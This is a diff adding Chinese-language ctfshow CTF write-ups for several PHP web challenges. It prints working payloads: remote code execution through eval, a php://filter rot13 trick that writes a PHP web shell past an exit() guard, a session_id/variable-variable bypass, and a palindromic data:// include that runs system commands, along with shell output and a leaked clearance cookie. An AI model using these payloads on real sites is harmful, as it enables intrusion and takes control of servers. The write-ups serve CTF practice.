@@ -5582,6 +5582,253 @@ code=<script language="php">system('cat /f1agaaa');</script>
 
 ------
 
+### 新春欢乐赛热身
+
+靶机的代码如下：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2022-01-16 15:42:02
+# @Last Modified by:   h1xa
+# @Last Modified time: 2022-01-24 22:14:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+eval($_GET['f']);
+```
+
+`/?f=system('ls /')`找了很多目录未果。`/?f=phpinfo();`查看`PHP`信息，在`auto_prepend_file`中看到`/etc/ssh/secret/youneverknow/secret.php`。
+
+`/?f=system(%27tac%20/etc/ssh/secret/youneverknow/secret.php%27);`可以看到以下内容：
+
+```php
+$ctfshow="ctfshow{b80f4c68-8452-41c6-9a09-3805bb0ee6e7}";highlight_file("/var/www/html/index.php"); error_reporting(0);
+```
+
+或`/?f=print_r(get_defined_vars());`查看当前页面的变量。踏破铁鞋无觅处，得来全不费工夫。
+
+```php
+Array ( [_GET] => Array ( [f] => print_r(get_defined_vars()); ) [_POST] => Array ( ) [_COOKIE] => Array ( [_ga] => GA1.2.1506895976.1768713285 [_ga_PP4LXQY4W0] => GS2.1.s1768713285$o1$g0$t1768713323$j22$l0$h0 [cf_clearance] => A3HsXHgPcJckknOPzifatUWDF0CWuhn4T1DZVuCEWpM-1769691591-1.2.1.1-qSk0u4HyZdLgUpVkDuITx386hIolnktJqnTOSQ4Ojd0XhkgfHTh8Plz2OtVtdS.cm9rP51tPiG7AMIm05S6h0z6wfgZ0w4IN_WC0hd9_4VrTTpYH5jRg1Oc_ogRD3IYsa1wqsXtbhElhjU79RjCj5R4_7HJVPfYJmca7D6ieGXjvJpoVAZ23K8KZBfHg32a_vscXfRtPkt0OZplP8dG0JK_A.hQFKhk1fT4WUP.fP6I ) [_FILES] => Array ( ) [ctfshow] => ctfshow{b80f4c68-8452-41c6-9a09-3805bb0ee6e7} )
+```
+
+提交`ctfshow{b80f4c68-8452-41c6-9a09-3805bb0ee6e7}`即可。
+
+------
+
+### 新春欢乐赛web1
+
+靶机的信息如下：
+
+```php
+<?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2022-01-16 15:42:02
+# @Last Modified by:   h1xa
+# @Last Modified time: 2022-01-24 22:14:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+highlight_file(__FILE__);
+error_reporting(0);
+
+$content = $_GET[content];
+file_put_contents($content,'<?php exit();'.$content);
+```
+
+我们可以使用`PHP`伪协议`php://filter/write`写入文件。相比`base64`编码，`rot13`的绕过死亡之`exit`更加方便，因为不用考虑前面添加的内容是否可以用`base64`解码，也不需要计算可`base64`解码的字符数量。先用`Python`编写代码将`<?php phpinfo()?;>`进行`rot13`加密，得到`<?cuc cucvasb()?;>`。
+
+```python
+>>> from codecs import encode
+>>> encode('<?php phpinfo();?>', 'rot13')
+'<?cuc cucvasb();?>'
+```
+
+使用`PHP`伪协议`php://filter/write`和`string.rot13`，将`<?cuc cucvasb()?;>`写入`info.php`中。
+
+```
+/?content=php://filter/write=string.rot13|<?cuc%20cucvasb();?>|/resource=info.php
+```
+
+访问`/info.php`可以看到`PHP`相关信息，说明我们的`POC`构造成功。
+
+再用`Python`编写代码将`<?php @eval($_POST["shell"]);?>`进行`rot13`加密。
+
+```python
+>>> encode('<?php @eval($_POST["shell"]);?>', 'rot13')
+'<?cuc @riny($_CBFG["furyy"]);?>'
+```
+
+使用`PHP`伪协议`php://filter/write`和`string.rot13`，将`<?cuc @riny($_CBFG["furyy"]);?>`写入到`shell.php`中。那两条竖线中间的内容就是我们想要写入的`rot13`加密内容。
+
+```
+?content=php://filter/write=string.rot13|<?cuc @riny($_CBFG["furyy"]);?>|/resource=shell.php
+```
+
+接着访问靶机的`/shell.php`，用`HackBar`构造`POST`请求`shell=var_dump(scandir('/'));`，可得：
+
+```php
+string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(3) "dev" [5]=> string(3) "etc" [6]=> string(8) "flag.txt" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "media" [10]=> string(3) "mnt" [11]=> string(3) "opt" [12]=> string(4) "proc" [13]=> string(4) "root" [14]=> string(3) "run" [15]=> string(4) "sbin" [16]=> string(3) "srv" [17]=> string(3) "sys" [18]=> string(3) "tmp" [19]=> string(3) "usr" [20]=> string(3) "var" } |/erfbhepr=furyy.cuc
+```
+
+直接用`AntSword`连接靶机的`shell.php`，打开虚拟终端后`cat /flag.txt`拿到`flag`。
+
+如果用`php://filter/read=convent.base64-encode/resource=/flag.txt`是会被直接`exit()`的。用`var_dump(file_get_contents('/flag.txt'));`也没用。
+
+```
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux 4963e2e42df5 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls -l /
+total 72
+drwxr-xr-x    1 root     root          4096 Sep  3  2020 bin
+drwxr-xr-x    5 root     root           340 Feb  1 14:45 dev
+drwxr-xr-x    1 root     root          4096 Feb  1 14:45 etc
+-rw-r--r--    1 www-data www-data        46 Feb  1 14:45 flag.txt
+drwxr-xr-x    1 root     root          4096 Jun 11  2020 home
+drwxr-xr-x    1 root     root          4096 Sep 22  2020 lib
+drwxr-xr-x    5 root     root          4096 May 29  2020 media
+drwxr-xr-x    2 root     root          4096 May 29  2020 mnt
+drwxr-xr-x    2 root     root          4096 May 29  2020 opt
+dr-xr-xr-x  648 root     root             0 Feb  1 14:45 proc
+drwx------    1 root     root          4096 Sep  3  2020 root
+drwxr-xr-x    1 root     root          4096 Sep 22  2020 run
+drwxr-xr-x    1 root     root          4096 Sep 22  2020 sbin
+drwxr-xr-x    2 root     root          4096 May 29  2020 srv
+dr-xr-xr-x   13 root     root             0 Jan  3 05:13 sys
+drwxrwxrwt    1 root     root          4096 Feb  1 14:45 tmp
+drwxr-xr-x    1 root     root          4096 Sep 22  2020 usr
+drwxr-xr-x    1 root     root          4096 Sep 22  2020 var
+(www-data:/var/www/html) $ cat /flag.txt
+ctfshow{e585186c-c242-467b-b5a6-424266ef4038}
+```
+
+提交`ctfshow{e585186c-c242-467b-b5a6-424266ef4038}`即可。
+
+------
+
+### 新春欢乐赛web2
+
+靶机的代码如下：
+
+```php
+<?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2022-01-16 15:42:02
+# @Last Modified by:   h1xa
+# @Last Modified time: 2022-01-24 22:14:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+highlight_file(__FILE__);
+session_start();
+error_reporting(0);
+include "flag.php";
+if(count($_POST)===1){
+    extract($_POST);
+        if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
+            echo $flag;
+        }
+}
+?>
+```
+
+用`HackBar`构造`POST`请求，`Body`中的数据为`session_id=session_id`，`MODIFY HEADER`添加文件头`Cookie`值`PHPSESSID=HappyNewYear`。或者用`Burp Suite`抓包修改`POST`请求数据。
+
+```
+POST / HTTP/1.1
+Host: 37c1a8f8-3a67-4633-9ba0-5e949d3b5576.challenge.ctf.show
+Cookie: PHPSESSID=HappyNewYear
+Content-Length: 21
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://37c1a8f8-3a67-4633-9ba0-5e949d3b5576.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+Connection: keep-alive
+
+session_id=session_id
+```
+
+提交`ctfshow{5109b79e-a325-46b1-a349-3f1cce25cb76}`即可。
+
+------
+
+### 单身杯web签到
+
+进入靶机后，看到以下代码：
+
+```php
+<?php
+
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2022-03-19 12:10:55
+# @Last Modified by:   h1xa
+# @Last Modified time: 2022-03-19 13:27:18
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+$file = $_POST['file'];
+
+if(isset($file)){
+    if(strrev($file)==$file){
+        include $file;
+    }
+}
+```
+
+`isset($file)`函数：如果指定变量`$file`存在且不为`NULL`，则返回`TRUE`，否则返回`FALSE`。
+
+`strrev()`函数能翻转字符串，因此整段代码逻辑是：通过`POST`请求传入参数`file`，如果传入的file参数存在且不为`NULL`，则反转整个`file`参数所传递的字符串；如果反转后的字符串和原字符串一致，那么就用`include`文件包含`file`参数值。我们可以使用`data://`协议构造`Payload`。用`HackBar`查看根目录。
+
+```
+file=data://text/plain,<?php eval($_POST[cmd]);?>>?;)]dmc[TSOP_$(lave php?<,nialp/txet//:atad&cmd=system("ls /");
+```
+
+靶机显示的内容如下：
+
+> bin dev etc f1agaaa home lib media mnt opt proc root run sbin srv sys tmp usr var >?;)]dmc[TSOP_$(lave php?<,nialp/txet//:atad
+
+再用`tac /f1agaaa`查看`flag`。
+
+```
+file=data://text/plain,<?php eval($_POST[cmd]);?>>?;)]dmc[TSOP_$(lave php?<,nialp/txet//:atad&cmd=system("tac /f1agaaa");
+```
+
+> ctfshow{a8410448-a1a8-4ae4-967a-51d14dbc553d} >?;)]dmc[TSOP_$(lave php?<,nialp/txet//:atad
+
+提交`ctfshow{a8410448-a1a8-4ae4-967a-51d14dbc553d}`即可。
+
+------
+
 ### 剪刀石头布
 
 > hint：我为啥要ini_set来着 
